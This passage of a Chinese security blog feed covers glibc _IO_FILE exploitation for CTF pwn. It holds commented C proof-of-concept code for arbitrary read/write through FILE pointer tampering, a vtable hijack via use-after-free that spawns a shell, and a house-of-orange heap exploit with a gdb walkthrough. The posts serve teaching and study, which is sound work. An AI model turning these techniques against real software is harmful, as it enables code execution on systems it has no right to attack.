+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130721693589g8lyo0h.png?imageslim" alt="paste image"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题非常不错，不仅学到了利用 <code>file</code> 结构体的新型攻击方式，还可以通过这道题深入理解堆分配的流程。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://brieflyx.me/2016/heap/glibc-heap/" target="_blank" rel="external">http://brieflyx.me/2016/heap/glibc-heap/</a></p>
+<p><a href="https://github.com/scwuaptx/CTF/tree/master/2017-writeup/hitcon/ghost_in_the_heap" target="_blank" rel="external">https://github.com/scwuaptx/CTF/tree/master/2017-writeup/hitcon/ghost_in_the_heap</a></p>
+<p><a href="https://tradahacking.vn/hitcon-2017-ghost-in-the-heap-writeup-ee6384cd0b7" target="_blank" rel="external">https://tradahacking.vn/hitcon-2017-ghost-in-the-heap-writeup-ee6384cd0b7</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> file struct </tag>
+            
+            <tag> off-by-null </tag>
+            
+            <tag> heap learning </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Pwn with File结构体（二）]]></title>
+      <url>/2017/12/07/pwn_with_file_part2.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<hr>
+<p>最新版的 <code>libc</code> 中会对 <code>vtable</code> 检查，所以之前的攻击方式，告一段落。下面介绍一种，通过修改 <code>_IO_FILE</code> 实现任意地址读和任意地址写的方式。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><code>_IO_FILE</code> 通过这些指针，来读写数据。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512654157088d9edyn3q.png?imageslim" alt="paste image"><br>如果我们修改了它们，然后通过一些文件读写函数时，我们就能实现 任意地址读写。</p>
+<p> <strong>任意地址读</strong></p>
+<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1512656021050j3vjc54v.png?imageslim" alt="paste image"></p>
+<p> 代码示例<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"> #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    char *msg = &quot;hello_file&quot;;</div><div class="line"></div><div class="line">    char *buf = malloc(100);</div><div class="line">    read(0, buf, 100);</div><div class="line">    fp = fopen(&quot;key.txt&quot;, &quot;rw&quot;);</div><div class="line"></div><div class="line">    // 设置 flag 绕过 check</div><div class="line">    fp-&gt;_flags &amp;= ~8;</div><div class="line">    fp-&gt;_flags |= 0x800;</div><div class="line"></div><div class="line">    // _IO_write_base write数据的起始地址， _IO_write_ptr  write数据的终止地址</div><div class="line">    fp-&gt;_IO_write_base = msg;</div><div class="line">    fp-&gt;_IO_write_ptr = msg + 6;</div><div class="line"></div><div class="line">    //绕过检查</div><div class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</div><div class="line"></div><div class="line">    // write 的目的 文件描述符， 1 --&gt; 标准输出</div><div class="line">    fp-&gt;_fileno = 1;</div><div class="line">    fwrite(buf, 1, 100, fp);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1512656917401bhu6ayhp.png?imageslim" alt="paste image"></p>
+<p>  <strong>任意地址写</strong></p>
+<p>  <img src="http://oy9h5q2k4.bkt.clouddn.com/15126569407780y6n1s1m.png?imageslim" alt="paste image"></p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">  #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    char msg[100];</div><div class="line"></div><div class="line">    char *buf = malloc(100);</div><div class="line">    fp = fopen(&quot;key.txt&quot;, &quot;rw&quot;);</div><div class="line"></div><div class="line">    // 设置 flag 绕过 check</div><div class="line">    fp-&gt;_flags &amp;= ~4;</div><div class="line"></div><div class="line">    // _IO_buf_base buffer 的起始地址， _IO_buf_end  buffer 的终止地址</div><div class="line">    // fread 先把数据读入 [_IO_buf_base, _IO_buf_end] 形成的 buffer</div><div class="line">    // 然后复制到目的 buffer</div><div class="line">    fp-&gt;_IO_buf_base = msg;</div><div class="line">    fp-&gt;_IO_buf_end = msg + 100;</div><div class="line"></div><div class="line">    // 设置 文件描述符， 0---&gt; stdin, 从标准输入读数据</div><div class="line">    fp-&gt;_fileno = 0;</div><div class="line">    fread(buf, 1, 6, fp);</div><div class="line">    </div><div class="line">    puts(msg);</div><div class="line">    puts(buf);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>  <img src="http://oy9h5q2k4.bkt.clouddn.com/1512657551566q5ox73ro.png?imageslim" alt="paste image"></p>
+<p> <strong>利用 stdin / stdout 任意地址写/ 读</strong></p>
+<p><code>puts</code>, <code>scanf</code> 等一批系统函数默认使用的 <code>stdin</code> , <code>stdout</code> ,<code>stderr</code> 等结构体进行操作，通过修改这些结构体的内容，可以更方便的实现任意地址读，任意地址写。</p>
+<p> <code>stdin</code> 也是 <code>_IO_FILE</code> 结构体<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"> #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line"></div><div class="line">int global_val = 0xaabbccdd;</div><div class="line"></div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    int var;</div><div class="line"></div><div class="line">    fp = stdin;</div><div class="line"></div><div class="line">    fp-&gt;_flags &amp;= ~4;</div><div class="line"></div><div class="line">    fp-&gt;_IO_buf_base = stdout;</div><div class="line">    fp-&gt;_IO_buf_end = stdout + 100;</div><div class="line"></div><div class="line"></div><div class="line">    scanf(&quot;%d&quot;,&amp;var);</div><div class="line">    </div><div class="line">    printf(&quot;0x%x\n&quot;, global_val);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p> 运行之<br> <img src="http://oy9h5q2k4.bkt.clouddn.com/1512658393494amnz5255.png?imageslim" alt="paste image"></p>
+<p> 成功修改 <code>stdout</code> 结构体</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"> #include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp; </div><div class="line">    char *msg = &quot;hello_stdout&quot;;</div><div class="line"></div><div class="line">    char *buf = malloc(100);</div><div class="line"></div><div class="line">    fp = stdout;</div><div class="line"></div><div class="line">    // 设置 flag 绕过 check</div><div class="line">    fp-&gt;_flags &amp;= ~8;</div><div class="line">    fp-&gt;_flags |= 0x800;</div><div class="line"></div><div class="line">    // _IO_write_base write数据的起始地址， _IO_write_ptr  write数据的终止地址</div><div class="line">    fp-&gt;_IO_write_base = msg;</div><div class="line">    fp-&gt;_IO_write_ptr = msg + 12;</div><div class="line"></div><div class="line">    //绕过检查</div><div class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</div><div class="line"></div><div class="line">    // write 的目的 文件描述符， 1 --&gt; 标准输出</div><div class="line">    fp-&gt;_fileno = 1;</div><div class="line">    puts(&quot;&lt;-----&gt;this is append on msg &quot;);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/15126587803351zrlnl5p.png?imageslim" alt="paste image"></p>
+<p> 成功读到了， <code>msg</code> 的内容。</p>
+<p> 参考：</p>
+<p> <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="external">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> ctf </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> file struct </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Pwn with File结构体（一）]]></title>
+      <url>/2017/12/07/pwn_with_file_part1.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<hr>
+<p>利用 <code>FILE</code> 结构体进行攻击，在现在的 <code>ctf</code> 比赛中也经常出现，最近的 <code>hitcon2017</code> 又提出了一种新的方式。本文对该攻击进行总结。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先来一张 <code>_IO_FILE</code> 结构体的结构</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512636924331hh06dby3.png?imageslim" alt="paste image"></p>
+<p><code>_IO_FILE_plus</code> 等价于 <code>_IO_FILE</code> + <code>vtable</code> </p>
+<p>调试着来看看(64 位)</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151263718616115jrxm3q.png?imageslim" alt="paste image"></p>
+<p><code>vtable</code> 指向的位置是一组函数指针<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15126373161775c8fyo38.png?imageslim" alt="paste image"><br><strong>利用 <code>vtable</code> 进行攻击</strong></p>
+<p>通过一个 <code>uaf</code> 的示例代码来演示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">void pwn(void)</div><div class="line">&#123;</div><div class="line">    system(&quot;sh&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 用于伪造 vtable</div><div class="line">void * funcs[] = &#123;</div><div class="line">    NULL, // &quot;extra word&quot;</div><div class="line">    NULL, // DUMMY</div><div class="line">    exit, // finish</div><div class="line">    NULL, // overflow</div><div class="line">    NULL, // underflow</div><div class="line">    NULL, // uflow</div><div class="line">    NULL, // pbackfail</div><div class="line">    NULL, // xsputn</div><div class="line">    NULL, // xsgetn</div><div class="line">    NULL, // seekoff</div><div class="line">    NULL, // seekpos</div><div class="line">    NULL, // setbuf</div><div class="line">    NULL, // sync</div><div class="line">    NULL, // doallocate</div><div class="line">    NULL, // read</div><div class="line">    NULL, // write</div><div class="line">    NULL, // seek</div><div class="line">    pwn,  // close</div><div class="line">    NULL, // stat</div><div class="line">    NULL, // showmanyc</div><div class="line">    NULL, // imbue</div><div class="line">&#125;;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;   </div><div class="line">    FILE *fp;  // _IO_FILE 结构体</div><div class="line">    unsigned char *str;</div><div class="line"></div><div class="line">    printf(&quot;sizeof(FILE): 0x%x\n&quot;, sizeof(FILE));</div><div class="line"></div><div class="line">    /* _IO_FILE + vtable_ptr 分配一个 _IO_FILE_plus 结构体 */</div><div class="line">    str = malloc(sizeof(FILE) + sizeof(void *));</div><div class="line">    printf(&quot;freeing %p\n&quot;, str);</div><div class="line">    free(str);</div><div class="line"></div><div class="line">    /*打开一个文件，会分配一个 _IO_FILE_plus 结构体 ， 会使用刚刚 free 掉的内存*/</div><div class="line">    if (!(fp = fopen(&quot;/dev/null&quot;, &quot;r&quot;))) &#123;</div><div class="line">        perror(&quot;fopen&quot;);</div><div class="line">        return 1;</div><div class="line">    &#125;</div><div class="line">    printf(&quot;FILE got %p\n&quot;, fp);</div><div class="line"></div><div class="line">    /* 取得地址  */</div><div class="line">    printf(&quot;_IO_jump_t @ %p is 0x%08lx\n&quot;,</div><div class="line">           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));</div><div class="line"></div><div class="line">    /* 修改 vtable 指针 */</div><div class="line">    *(unsigned long*)(str + sizeof(FILE)) = (unsigned long)funcs;</div><div class="line">    printf(&quot;_IO_jump_t @ %p now 0x%08lx\n&quot;,</div><div class="line">           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));</div><div class="line"></div><div class="line">    /* 调用 fclose 触发 close */</div><div class="line">    fclose(fp);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>首先分配一个 <code>_IO_FILE_plus</code> 大小的内存块</li>
+<li>然后释放掉调用 <code>fopen</code> 分配 <code>_IO_FILE_plus</code>  结构体</li>
+<li>修改 <code>fp</code> 的 <code>vtable</code> 指针到我们布局的地址</li>
+<li>调用 <code>fclose</code> 函数, 进而调用 <code>pwn</code></li>
+</ul>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512637077462pn33x6eg.png?imageslim" alt="paste image"></p>
+<p>调试可以看到，分配的大小为 <code>0xf0</code>(也就是 <code>0xe0+0x10</code>) 和<code>_IO_FILE_plus</code> 的大小是一样的</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151263746988846mmixxo.png?imageslim" alt="paste image"></p>
+<p><code>free</code> 掉后，调用 <code>fopen</code> 会占用这个内存<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1512637720387deshksip.png?imageslim" alt="paste image"></p>
+<p>查看 <code>vtable</code> 也是符合预期<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15126377713979pirrqdn.png?imageslim" alt="paste image"></p>
+<p>替换<code>vtable</code>指针之后<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15126378684082t5esiwh.png?imageslim" alt="paste image"></p>
+<p><code>close</code> 函数已经被修改为 <code>pwn</code> 函数，最后调用 <code>fclose</code> 函数，就会调用 <code>pwn</code> 函数</p>
+<p><strong>house of orange</strong></p>
+<p>为了便于调试，使用 <a href="https://raw.githubusercontent.com/shellphish/how2heap/master/house_of_orange.c" target="_blank" rel="external">how2heap</a> 的代码进行调试分析。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int winner ( char *ptr);</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line"></div><div class="line"></div><div class="line">    char *p1, *p2;</div><div class="line">    size_t io_list_all, *top;</div><div class="line"></div><div class="line">    // 首先分配一个 0x400 的 chunk</div><div class="line">    p1 = malloc(0x400-16);</div><div class="line"></div><div class="line">    // 拿到 top chunk的地址</div><div class="line">    top = (size_t *) ( (char *) p1 + 0x400 - 16);</div><div class="line">    // 修改 top chunk 的 size</div><div class="line">    top[1] = 0xc01;</div><div class="line"></div><div class="line">    // 触发 syscall 的 _int_free, top_chunk 放到了 unsort bin</div><div class="line">    p2 = malloc(0x1000);</div><div class="line"></div><div class="line">    // 根据 fd 指针的偏移计算 io_list_all 的地址</div><div class="line">    io_list_all = top[2] + 0x9a8;</div><div class="line"></div><div class="line">    // 修改 top_chunk 的 bk 为  io_list_all - 0x10 ， 后面会触发</div><div class="line">    top[3] = io_list_all - 0x10;</div><div class="line"></div><div class="line">    /*</div><div class="line">     设置 fp 指针指向位置 开头 为 /bin/sh</div><div class="line">    */</div><div class="line"></div><div class="line">    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);</div><div class="line"></div><div class="line">    // 修改 top chunk 的 大小 为 0x60</div><div class="line">    top[1] = 0x61;</div><div class="line"></div><div class="line">    /*</div><div class="line">      为了可以正常调用 overflow() ，需要满足一些条件</div><div class="line">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</div><div class="line">    */</div><div class="line"></div><div class="line">    _IO_FILE *fp = (_IO_FILE *) top;</div><div class="line"></div><div class="line">    fp-&gt;_mode = 0; </div><div class="line">    fp-&gt;_IO_write_base = (char *) 2;</div><div class="line">    fp-&gt;_IO_write_ptr = (char *) 3; </div><div class="line"></div><div class="line"></div><div class="line">    // 设置虚表</div><div class="line">    size_t *jump_table = &amp;top[12]; // controlled memory</div><div class="line">    jump_table[3] = (size_t) &amp;winner;</div><div class="line">    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8</div><div class="line"></div><div class="line">    // 再次 malloc, fastbin, smallbin都找不到需要的大小，会遍历 unsort bin 把它们添加到对应的 bins 中去</div><div class="line">    // 之前已经把 top-&gt;bk 设置为 io_list_all - 0x10, 所以会把 io_list_all 的值 设置为 fd, </div><div class="line">    // 也就是 main_arena+88 </div><div class="line">    // _IO_FILE_plus + 0x68 --&gt; _china , main_arena+88 + 0x68 为 smallbin[5], 块大小为 0x60 </div><div class="line">    // 所以要把 top的 size 设置为 0x60</div><div class="line">    malloc(10);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int winner(char *ptr)</div><div class="line">&#123; </div><div class="line">    system(ptr);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>代码的流程如下:</p>
+<ul>
+<li>首先分配 <code>0x400</code> 字节的块</li>
+<li>修改 <code>top chunk</code> 的 <code>size</code> 域为 <code>0xc01</code></li>
+<li><code>malloc(0x1000)</code> 触发 <code>_int_free</code> , <code>top</code> 被放到了 <code>unsorted bin</code> , 下面称它为 <code>old_top</code></li>
+<li>布局 <code>old_top</code> , 设置 <code>bk = io_list_all - 0x10</code> ， 把<code>old_top</code>伪造成一个 <code>_IO_FILE_plus</code>,并设置好<code>vtable</code></li>
+<li><code>malloc(10)</code> 由于此时 <code>fastbin</code> , <code>smallbin</code> 均为空，所以会进入遍历 <code>unsorted bin</code> ，并根据相应的大小放到对应的 <code>bin</code> 中。上一步设置 <code>old_top</code> 大小为 <code>0x60</code> ， 所以在放置<code>old_top</code> 过程中，先通过  <code>unsorted bin attack</code> 修改 <code>io_list_all</code> 为 <code>fd也就是 main_arena-&gt;top</code> ， 然后 <code>old_top</code> 会被链到 <code>smallbin[5]</code> （大小为 0x60 ）, 接着继续遍历 <code>unsorted bin</code>，这一步 会 <code>abort</code>,原理下面说， 然后会遍历 <code>io_list_all</code> 调用 <code>_IO_OVERFLOW (fp, EOF)</code>. 伪造 <code>vtable</code>  getshell。</li>
+</ul>
+<p><strong>下面调试分析之</strong></p>
+<p>参考断点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">break main</div><div class="line">bp genops.c:775</div><div class="line">bp  malloc.c:3472</div></pre></td></tr></table></figure>
+<p>调试到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">23	     p2 = malloc(0x1000);</div></pre></td></tr></table></figure>
+<p><code>top chunk</code> 的 <code>size</code> 已经被修改，<code>unsorted bin</code> 还是空的。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512649343374w57z9tul.png?imageslim" alt="paste image"></p>
+<p>单步步过，发现 <code>top</code> 已经被 添加到 <code>unsorted bin</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512649474593kp7jamb4.png?imageslim" alt="paste image"><br>然后就是一系列的伪造 <code>_IO_FILE_plus</code> 操作， 直接运行到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">62	     malloc(10);</div></pre></td></tr></table></figure></p>
+<p>看看布局好后的结果</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512649649115pufiaajo.png?imageslim" alt="paste image"></p>
+<p><code>vtable</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/15126496905714c9muqxc.png?imageslim" alt="paste image"><br>可以看到 <code>__overflow</code> 被设置为 <code>winner</code> 函数，所以只要调用 <code>__overflow</code> 就会调用 <code>winner</code> 。</p>
+<p>下面看看，怎么通过堆布局实现 <code>getshell</code></p>
+<p>在 <code>malloc.c:3472</code> 下好断点，运行，会被断下来。</p>
+<p>这里是遍历 <code>unsorted bin</code> 的流程。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512650027099nn0durlb.png?imageslim" alt="paste image"></p>
+<p>会进入这里原因在于此时 <code>fastbin</code> , <code>smallbin</code> 均为空，不能满足分配的需求，接着就会进入这里。</p>
+<p>这里会有一个 <code>check</code> ，过不去就会 <code>malloc_printerr</code> ，进而 <code>abort</code> 。 </p>
+<p>第一次进入这里是可以过去的，然后会根据大小把 <code>victim</code> 放到合适的 <code>bin</code> 中，之前我们已经 把 <code>old_top</code> 的大小设置成了 <code>0x60</code>, 这里他就会被放到 <code>smallbin[5]</code> 里。</p>
+<p>同时插入之前会先从<code>unsorted bin</code> 中 <code>unlink</code>  (unsorted bin attack) ,这时可以 往 <code>victim-&gt;bk + 0x10</code> 写入 <code>victim-&gt;fd</code>， 之前我们已经设置 <code>victim-&gt;bk 为 _IO_list_all-0x10</code>, 所以在这里就可以 修改 <code>_IO_list_all</code> 为 <code>main_arena-&gt;top</code></p>
+<p>第一次遍历 <code>unsorted bin</code>, 从 <code>unsorted bin</code> 移除时的相关变量,内存数据。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512651092965lxj5dz39.png?imageslim" alt="paste image"></p>
+<p>可以看到 <code>bck</code> 会成为<code>unsorted bin</code> 的起始位置，然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bck-&gt;fd = unsorted_chunks (av);</div></pre></td></tr></table></figure></p>
+<p>而且此时 <code>bck-&gt;fd</code> 为 <code>_IO_list_all</code>。</p>
+<p>继续运行，再次断在了 <code>malloc.c:3472</code>。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512651546282hwz6e5ug.png?imageslim" alt="paste image"></p>
+<p>可以看到，此时的 <code>_IO_list_all</code> 已经被修改成了 <code>&lt;main_arena+88&gt;</code>, <code>old_top</code> 被放到了 <code>smallbin[5]</code>， 而且此时 <code>victim-&gt;size</code> 为0， 所以下面会进入 <code>abort</code> 的流程。</p>
+<p>我们来看看，此时构造的 <code>_IO_list_all</code> 的内容</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512652089939d3g3frdi.png?imageslim" alt="paste image"></p>
+<p><code>_IO_list_all</code> 偏移 <code>0x68</code> 为 <code>_chain</code> ，这也是之前设置 <code>old_top</code> 大小为 <code>0x60</code> 的原因。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1512652147336uaktzxn6.png?imageslim" alt="paste image"><br>这样就成功把 <code>old_top</code> 链入了 <code>_IO_list_all</code>。</p>
+<p>下面看看该怎么拿 <code>shell</code><br>在 <code>abort</code> 函数中会调用 <code>fflush(null)</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512652347680zoy5v0u2.png?imageslim" alt="paste image"></p>
+<p>实际调用的是 <code>_IO_flush_all_lockp</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512652528433f4lzgdak.png?imageslim" alt="paste image"></p>
+<p>遍历 <code>_IO_list_all</code> 调用 <code>_IO_OVERFLOW (fp, EOF)</code>，其实就是调用 <code>fp-&gt;vtable-&gt;__overflow(fp,eof)</code></p>
+<p>第一次执行循环时，可以看上面的 <code>_IO_list_all</code> 数据，发现进入不了 <code>_IO_OVERFLOW</code> 这个判断，所以<code>_IO_list_all</code> 第一项的 <code>vtable</code> 中的数据是坏的也没有关系。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512653250943jy3lqm1y.png?imageslim" alt="paste image"></p>
+<p>第二次循环，通过 <code>fp = fp-&gt;_chain</code> 找到我们的 <code>old_top</code>, 我们已经在这布局好了数据。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512653351122a7sdg8oj.png?imageslim" alt="paste image"></p>
+<p>运行 <code>getshell</code></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>FILE</code> 结构体是一个很好的攻击目标，学习一下很有必要<br>调试时，尽可能用最小的代码复现问题。</p>
+<p>参考链接：</p>
+<p><a href="http://www.evil0x.com/posts/13764.html" target="_blank" rel="external">http://www.evil0x.com/posts/13764.html</a></p>
+<p><a href="https://securimag.org/wp/news/buffer-overflow-exploitation/" target="_blank" rel="external">https://securimag.org/wp/news/buffer-overflow-exploitation/</a></p>
